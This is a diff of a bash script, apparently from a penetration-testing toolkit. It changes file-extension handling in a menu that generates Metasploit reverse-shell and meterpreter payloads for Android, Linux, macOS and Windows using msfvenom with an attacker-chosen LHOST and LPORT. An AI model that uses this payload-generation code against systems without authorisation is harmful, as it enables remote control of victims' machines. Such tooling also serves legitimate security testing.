@@ -3505,32 +3505,32 @@ read choice
 
 case $choice in
      1) payload="android/meterpreter/reverse_tcp"
-	   extention="apk"
+	   extention=".apk"
         format="raw"
         arch="dalvik"
 	   platform="android";;
      2) payload="linux/x64/shell_reverse_tcp"
-        extention="elf"
+        extention=""
         format="elf"
         arch="x86_64"
 	   platform="linux";;
      3) payload="linux/x86/meterpreter/reverse_tcp"
-        extention="elf"
+        extention=""
         format="elf"
         arch="x86"
 	   platform="linux";;
      4) payload="osx/x64/shell_reverse_tcp"
-	   extention="macho"
+	   extention=""
 	   format="macho"
         arch="x86_64"
 	   platform="osx";;
      5) payload="windows/meterpreter/reverse_tcp"
-	   extention="exe"
+	   extention=".exe"
 	   format="exe"
         arch="x86"
 	   platform="windows";;
      6) payload="windows/x64/meterpreter/reverse_tcp"
-	   extention="exe"
+	   extention=".exe"
 	   format="exe"
         arch="x86_64"
 	   platform="windows";;
@@ -3558,7 +3558,7 @@ if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
 fi
 
 echo
-$msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch.$extention
+$msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
 echo
 echo
 exit
